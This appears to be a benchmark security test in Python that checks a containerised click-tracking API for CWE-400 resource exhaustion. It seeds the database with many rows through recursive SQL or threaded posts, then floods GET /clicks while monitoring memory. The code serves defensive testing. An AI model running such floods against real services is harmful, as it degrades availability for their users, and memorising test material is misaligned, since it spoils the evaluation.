...
def sec_test_uncontrolled_resource_consumption(
    ...
    logger.info(
        "Starting fixed CWE-400 PoC for Click Tracking API (unit-corrected thresholds)"
    )

    # Phase 0: Baseline memory (assume memory_usage returns MB as float)
    try:
        baseline_mb = float(memory_usage(app.container_id))
        logger.info("Baseline memory usage: %.2f MB", baseline_mb)
    except Exception as e:
        logger.warning("Failed to read baseline memory usage: %s", e)
        baseline_mb = 0.0

    # Phase 1: Ensure DB exists and seed with many rows via SQLite
    db_path = f"{app.env.workdir}/db.sqlite3"
    # Trigger DB creation/table migration if needed
    try:
        requests.post(f"{base_url}/click", timeout=5.0)
    except Exception:
        pass
    ...
    try:
        ...
        WITH RECURSIVE cnt(x) AS (
            SELECT 1
            UNION ALL
            SELECT x+1 FROM cnt WHERE x < {target_rows}
        )
        INSERT INTO clicks (id, timestamp)
        SELECT lower(hex(randomblob(16))), strftime('%Y-%m-%dT%H:%M:%SZ','now')
        FROM cnt;
        """
        execute_sql_on_docker(app.container_id, db_path, sql)
        try:
            cnt_res = execute_sql_on_docker(
                app.container_id, db_path, "SELECT COUNT(*) FROM clicks;"
            )
            out = cnt_res.stdout.decode() if hasattr(cnt_res, "stdout") else ""
            total_rows = int(str(out).strip().splitlines()[-1]) if out.strip() else -1
            logger.info(
                "Seeded clicks rows: %s", total_rows if total_rows >= 0 else "unknown"
            )
        except Exception:
            logger.info("Seed completed (row count check skipped).")
    except Exception as e:
        logger.warning("Direct DB seeding failed (%s). Falling back to API inserts.", e)
        session = requests.Session()
        session.headers.update({"Connection": "keep-alive"})
        ...
        def post_worker(n):
            ...
            for _ in range(n):
                try:
                    r = session.post(f"{base_url}/click", timeout=5.0)
        ...
        with ThreadPoolExecutor(max_workers=16) as ex:
            futures = [ex.submit(post_worker, batch) for _ in range(total // batch)]
            for f in as_completed(futures):
                try:
                    inserted += f.result()
                except Exception:
        ...
        try:
            ...
            pass
        logger.info("Fallback API insertions completed: %d", inserted)

    # Phase 2: Quick GET to observe payload size and status
    try:
        resp = requests.get(
            f"{base_url}/clicks",
            params={"date": "1970-01-01", "direction": ">="},
        ...
        logger.info(
            "Quick GET /clicks -> %s; Content-Length: %s",
            resp.status_code,
            resp.headers.get("Content-Length"),
        )
        resp.close()
    except Exception as e:
        logger.warning("Quick GET failed: %s", e)

    # Phase 3: Monitor memory while flooding GET /clicks
    # Fix: use MB for threshold (monitor expects MB)
    try:
        baseline_now_mb = float(memory_usage(app.container_id))
    except Exception:
        baseline_now_mb = baseline_mb or 0.0

    mem_threshold_mb = max(
        int((baseline_now_mb or 0.0) + 20), 64
    )  # baseline +20MB, at least 64MB
    storage_threshold_bytes = 1 * 1024 * 1024 * 1024  # not the focus

    monitor_duration_s = 25
    flood_duration_s = 20
    get_concurrency = 12

    monitor_result = {"ok": False, "done": False}
    ...
    def run_monitor():
        try:
            ok = monitor_container_resources(
                ...
                logger=logger,
                memory_usage_threshold=mem_threshold_mb,  # MB, not bytes
                storage_usage_threshold=storage_threshold_bytes,
            )
            monitor_result["ok"] = bool(ok)
        except Exception as e:
            logger.warning("Resource monitor failed: %s", e)
        finally:
            monitor_result["done"] = True

    mon_thread = threading.Thread(target=run_monitor, daemon=True)
    try:
        logger.info(
            "Monitoring container resources... (threshold: %d MB)", mem_threshold_mb
        )
        mon_thread.start()
    except Exception as e:
        logger.warning("Failed to start resource monitor: %s", e)
        mon_thread = None

    # GET flood
    stop_at = time.time() + flood_duration_s
    metrics = {
        "requests": 0,
        "success": 0,
        "status_counts": {},
    ...
    session = requests.Session()
    session.headers.update({"Connection": "keep-alive"})
    session.mount("http://", HTTPAdapter(pool_maxsize=max(64, get_concurrency * 2)))
    ...
    with ThreadPoolExecutor(max_workers=get_concurrency) as ex:
        futs = [ex.submit(worker) for _ in range(get_concurrency)]
    ...
    if mon_thread is not None:
        mon_thread.join(timeout=monitor_duration_s + 5)

    logger.info(
        "Flood done: %d requests, %d successes, status=%r, last Content-Length=%r. Monitor exceeded: %s (threshold=%d MB)",
        metrics["requests"],
        metrics["success"],
        metrics["status_counts"],
        metrics["last_content_length"],
        monitor_result.get("ok"),
        mem_threshold_mb,
    )

    functional_ok = metrics.get("success", 0) > 0
    impact_ok = bool(monitor_result.get("ok", False))

    if functional_ok and impact_ok:
